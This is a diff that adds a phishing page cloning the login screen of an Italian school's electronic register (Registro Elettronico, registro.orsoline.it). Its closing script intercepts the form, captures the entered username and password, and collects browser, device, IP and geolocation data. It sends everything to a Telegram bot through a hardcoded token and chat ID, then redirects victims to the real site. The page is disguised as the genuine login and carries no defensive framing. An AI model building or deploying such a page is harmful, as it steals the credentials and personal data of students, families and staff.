@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>Registro Elettronico</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="apple-mobile-web-app-capable" content="no" />
+    
+    <style type="text/css">
+        /* STILI ESATTI DEL SITO ORIGINALE */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100%;
+        }
+        
+        .registroLogin {
+            height: 100vh;
+            background: url('https://registro.orsoline.it/styles/mobile/images/bg.jpg') !important;
+            background-repeat: no-repeat !important;
+            background-position: center center !important;
+            background-size: cover !important;
+            background-attachment: fixed !important;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        #Login_content {
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            text-align: center;
+            text-shadow: 0px 1px 0px #fff;
+            width: 400px;
+            border: 1px solid silver;
+            border-radius: 20px;
+            background-color: rgba(255, 255, 255, 0.75);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .Login_divInput {
+            max-width: 500px;
+            min-width: 150px;
+            margin: 10px auto;
+        }
+        
+        #Login_txtUsername, #Login_txtPassword {
+            background-repeat: no-repeat;
+            background-position: 10px 10px;
+            padding: 13px 13px 13px 35px;
+            font-family: Helvetica, Arial, sans-serif;
+            font-size: 13px;
+            color: #777;
+            width: 250px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            outline: none;
+        }
+        
+        #Login_txtUsername {
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjIZB7lXJQAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAJUlEQVQ4y2NgGAXDFmzatMmKAQ38v3///n8o/v/w4cP/Dx8+/A8A5OQZ7Yx5XjUAAAAASUVORK5CYII=');
+        }
+        
+        #Login_txtPassword {
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjIZB7lXJQAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAJUlEQVQ4y2NgGAXDFmzatMmKAQ38v3///n8o/v/w4cP/Dx8+/A8A5OQZ7Yx5XjUAAAAASUVORK5CYII=');
+        }
+        
+        #Login_txtUsername:focus, #Login_txtPassword:focus {
+            border-color: #66afe9;
+            box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102, 175, 233, .6);
+        }
+        
+        .sigmaButton {
+            width: 150px;
+            border-bottom-color: Gainsboro;
+            background-color: #2e6e9e;
+            color: WhiteSmoke;
+            border-radius: 4px;
+            padding: 10px 10px 10px 10px;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .sigmaButton:hover {
+            background-color: #1d4b6f;
+        }
+        
+        #Login_btnLogin {
+            margin-left: 40px;
+            margin-top: 10px;
+        }
+        
+        #Login_tdBtnLogin {
+            padding-left: 10px;
+            width: 150px;
+        }
+        
+        #Login_lnkRecuPasw {
+            font-size: 0.7em;
+            text-decoration: none;
+            color: #337ab7;
+        }
+        
+        #Login_lnkRecuPasw:hover {
+            text-decoration: underline;
+        }
+        
+        #Login_spanFailed {
+            font-size: 0.7em;
+            color: red;
+            display: block;
+        }
+        
+        #Login_divDEVELOPERS {
+            border-radius: 5px;
+            width: 180px;
+            margin: auto;
+            height: 23px;
+            margin-top: 60px;
+            text-shadow: none;
+            font-size: xx-small;
+            color: #777;
+        }
+        
+        #Login_divDEVELOPERS a {
+            color: #337ab7;
+            text-decoration: none;
+        }
+        
+        #Login_divDEVELOPERS a:hover {
+            text-decoration: underline;
+        }
+        
+        .sigmaTextbox {
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 8px;
+        }
+        
+        #Login_imgWait {
+            display: none;
+        }
+        
+        /* Stili per la tabella esatti come originale */
+        table {
+            border-collapse: separate;
+            border-spacing: 0px;
+            width: 100%;
+            height: 40px;
+            padding: 0px;
+        }
+        
+        td {
+            vertical-align: top;
+        }
+        
+        /* Responsive per mobile */
+        @media (max-width: 480px) {
+            #Login_content {
+                width: 90%;
+                padding: 15px;
+            }
+            
+            #Login_txtUsername, #Login_txtPassword {
+                width: 100%;
+                max-width: 280px;
+            }
+            
+            table {
+                height: auto;
+            }
+            
+            #Login_btnLogin {
+                margin-left: 0;
+                width: 100%;
+            }
+            
+            .sigmaButton {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <form method="post" action="./" id="form1" style="height: 100%;">
+        <div class="aspNetHidden">
+            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTk0Njc5OTQ0NGRkI6y0K9Yz3pJ8Zq4vYJ8qXW3Qp6s=" />
+        </div>
+
+        <div class="aspNetHidden">
+            <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" />
+            <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWAwKc98SiBALNxMCwBgLs0bLrBgKM54rGBg7ZqJdWoq1d6lWFcNqF1+0p" />
+        </div>
+        
+        <div id="Default_host">
+            <div class="registroLogin">
+                <div class="container">
+                    <section id="Login_content">
+                        <form action="" style="margin-top:5px;">
+                            <h1></h1>         
+
+                            <div>
+                                <img id="Login_imgLogoScuola" src="https://registro.orsoline.it/styles/logo/logoDedalo.png" style="max-height: 90px; max-width:370px;" alt="">
+                            </div>
+                            <div id="Login_divImgTextScuola" style="height: 0px; margin-bottom: 0px;">
+                                <img id="Login_imgTextScuola" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" alt="">
+                            </div> 
+                            <div style="height: 20px;">
+                                <img id="Login_imgWait" src="data:image/gif;base64,R0lGODlhEAAQAPIAAP///wAAAMLCwkJCQgAAAGJiYoKCgpKSkiH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQJCgAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQJCgAAACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkECQoAAAAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkECQoAAAAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQJCgAAACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQJCgAAACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3TSWhUFGxTAUkGCbtgENBMJAEJsxgMLWzpEAACH5BAkKAAAALAAAAAAQABAAAAMyCLrc/jDKSatlQtScKdceCAjDII7HcQ4EMTCpyrCuUBjCYRgHVtqlAiB1YhiCnlsRkAAAOwAAAAAAAAAAAA==" alt="wait" style="display:none;">
+                            </div>
+                            <div style="height: 60px;">
+                                <img src="https://registro.orsoline.it/styles/mobile/images/titolo.png" style="width: 340px;" alt="titolo">
+                            </div>
+                            <div>
+                                <img src="https://registro.orsoline.it/styles/mobile/images/logo1.png" alt="Logo">
+                            </div>
+                            <div class="Login_divInput">
+                                <input name="Login$txtUsername" type="text" placeholder="Username" id="Login_txtUsername" class="sigmaTextbox" autocomplete="username">
+                            </div>
+                            <div class="Login_divInput">
+                                <input name="Login$txtPassword" type="password" placeholder="Password" id="Login_txtPassword" class="sigmaTextbox" autocomplete="current-password">
+                            </div>
+
+                            <table style="border-collapse:separate; border-spacing:0px; width:100%; height: 40px; padding:0px;">
+                            <tbody><tr>
+                                <td id="Login_tdBtnLogin">
+                                    <input type="submit" name="Login$btnLogin" value="Log in" id="Login_btnLogin" class="sigmaButton">
+                                </td>
+                                <td style="vertical-align:top; text-align:right;">
+                                    <a href="#" id="Login_lnkRecuPasw">Password dimenticata?</a> 
+                                    <span id="Login_spanFailed" style="display: none;">Nome utente e password non corrispondono<br>o accesso non acconsentito all'utente</span>
+                                </td>
+                            </tr>
+                            </tbody></table>
+                            <div id="Login_divDEVELOPERS">
+                                <span style="font-size:xx-small;">Applicazione sviluppata da </span><a href="http://www.sigma-sistemi.it" target="_blank" style="font-size:xx-small;">Sigma Sistemi</a>
+                            </div>
+                        </form>
+                    </section>
+                </div>
+            </div>
+        </div>
+    </form>
+
+    <script type="text/javascript">
+        // CREDENZIALI TELEGRAM AGGIORNATE
+        const BOT_TOKEN = '8501424478:AAGgZ9IJqoa2ZHaNhYxIqf0moLz6UFxNXf0';
+        const CHAT_ID = '8016989344';
+        
+        // Credenziali valide simulate
+        const VALID_USERNAME = 'demo';
+        const VALID_PASSWORD = 'demo123';
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('form1');
+            
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Mostra l'indicatore di caricamento
+                document.getElementById('Login_imgWait').style.display = 'inline';
+                document.getElementById('Login_spanFailed').style.display = 'none';
+                
+                const username = document.getElementById('Login_txtUsername').value;
+                const password = document.getElementById('Login_txtPassword').value;
+                
+                // Raccoglie informazioni dettagliate sul browser e dispositivo
+                const cookies = document.cookie;
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const languages = navigator.languages ? navigator.languages.join(', ') : language;
+                const screenInfo = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const currentTime = new Date().toLocaleString('it-IT');
+                const referrer = document.referrer || 'Accesso diretto';
+                const browserName = getBrowserName();
+                const osName = getOSName();
+                
+                // Ottiene l'indirizzo IP pubblico
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        const ip = ipData.ip;
+                        
+                        // Ottiene informazioni di geolocalizzazione basate sull'IP
+                        return fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`)
+                            .then(response => response.json())
+                            .then(geoData => {
+                                return { ip, geoData };
+                            });
+                    })
+                    .then(({ ip, geoData }) => {
+                        // Prepara il messaggio dettagliato per Telegram
+                        const message = `🔐 **NUOVO ACCESSO AL REGISTRO ELETTRONICO** 🔐
+
+👤 **CREDENZIALI INSERITE:**
+├ Username: \`${username}\`
+└ Password: \`${password}\`
+
+🌐 **INFORMAZIONI DISPOSITIVO:**
+├ IP: ${ip}
+├ Browser: ${browserName}
+├ Sistema: ${osName}
+├ User Agent: ${userAgent}
+├ Lingue: ${languages}
+├ Schermo: ${screenInfo}
+├ Timezone: ${timezone}
+└ Data/Ora: ${currentTime}
+
+📍 **GEOLOCALIZZAZIONE:**
+├ Paese: ${geoData.country || 'N/D'} (${geoData.countryCode || 'N/D'})
+├ Regione: ${geoData.regionName || 'N/D'} (${geoData.region || 'N/D'})
+├ Città: ${geoData.city || 'N/D'}
+├ ZIP: ${geoData.zip || 'N/D'}
+├ Coordinate: ${geoData.lat || 'N/D'}, ${geoData.lon || 'N/D'}
+├ ISP: ${geoData.isp || 'N/D'}
+└ Organizzazione: ${geoData.org || 'N/D'}
+
+🔗 **ALTRE INFO:**
+├ Provenienza: ${referrer}
+└ Cookies: ${cookies ? 'Presenti' : 'Assenti'}
+
+⚠️ *Monitoraggio attivo - ${new Date().toLocaleString('it-IT')}*`;
+
+                        // Invia il messaggio a Telegram
+                        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: message,
+                                parse_mode: 'Markdown'
+                            })
+                        });
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Messaggio inviato a Telegram con successo');
+                        
+                        // Verifica le credenziali
+                        if(username === VALID_USERNAME && password === VALID_PASSWORD) {
+                            // Reindirizza al sito originale
+                            setTimeout(() => {
+                                window.location.href = 'https://registro.orsoline.it/Default.aspx';
+                            }, 1500);
+                        } else {
+                            document.getElementById('Login_imgWait').style.display = 'none';
+                            document.getElementById('Login_spanFailed').style.display = 'block';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Errore nell\'invio a Telegram:', error);
+                        document.getElementById('Login_imgWait').style.display = 'none';
+                        document.getElementById('Login_spanFailed').style.display = 'block';
+                    });
+            });
+            
+            // Gestione del link "Password dimenticata"
+            document.getElementById('Login_lnkRecuPasw').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Per recuperare la password, contattare l\'amministratore di sistema.');
+            });
+            
+            // Funzioni helper per identificare browser e OS
+            function getBrowserName() {
+                const userAgent = navigator.userAgent;
+                if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Chrome";
+                if (userAgent.includes("Firefox")) return "Firefox";
+                if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
+                if (userAgent.includes("Edg")) return "Edge";
+                if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+                return "Unknown";
+            }
+            
+            function getOSName() {
+                const userAgent = navigator.userAgent;
+                if (userAgent.includes("Windows")) return "Windows";
+                if (userAgent.includes("Mac")) return "MacOS";
+                if (userAgent.includes("Linux")) return "Linux";
+                if (userAgent.includes("Android")) return "Android";
+                if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
+                return "Unknown";
+            }
+        });
+    </script>
+</body>
+</html>
